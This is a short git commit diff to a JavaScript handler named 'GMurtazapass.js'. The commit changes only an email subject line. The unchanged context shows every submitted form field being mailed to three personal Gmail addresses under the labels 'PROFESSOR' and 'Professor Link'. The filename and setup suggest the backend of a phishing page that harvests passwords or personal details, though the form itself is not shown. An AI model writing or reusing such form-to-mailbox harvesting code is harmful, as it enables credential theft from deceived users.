3f328d150c352941c6e1d89d381cfd57bca9ca5f
linkquarry-hub <linkquarry@gmail.com>
2025-11-25 12:27:59 +0500

    Update GMurtazapass.js

--- GMurtazapass.js
+++ GMurtazapass.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
       to: "linkquarry@gmail.com,fahadali123gg@gmail.com,gmm7300@gmail.com",
-      subject: "rawal",
+      subject: "G Murtaza",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
